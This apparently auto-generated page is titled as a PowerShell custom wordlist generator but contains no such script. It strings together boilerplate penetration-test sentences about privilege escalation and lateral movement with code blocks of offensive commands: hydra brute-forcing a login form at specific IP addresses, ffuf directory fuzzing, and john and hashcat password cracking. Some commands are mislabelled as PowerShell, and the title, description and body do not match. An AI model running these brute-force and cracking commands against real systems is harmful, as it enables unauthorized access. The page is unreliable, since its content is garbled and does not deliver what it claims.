---
TitleSEO: "Custom Wordlist Generator in PowerShell | ZureFX"
TitlePost: "Custom Wordlist Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for custom wordlist generator. Built for security research and automation."
Keywords: "parser, go, fuzzer, automation, powershell, bash"
URL: "https://zurefx.github.io/scripting/script-custom-wordlist-generator-614.html"
URL_IMAGES: ""
Date: "2024-02-22"
Tags: "Parser, Go, Fuzzer, Automation, PowerShell, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-custom-wordlist-generator-614"
Permalink: "/scripting/script-custom-wordlist-generator-614.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `dcomexec`
- `chisel`
- `chisel`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.97.143 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.63.71.137/FUZZ
```

## Usage

### Basic Usage

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.86.216.226/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.37.91.102 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 5.58s
```
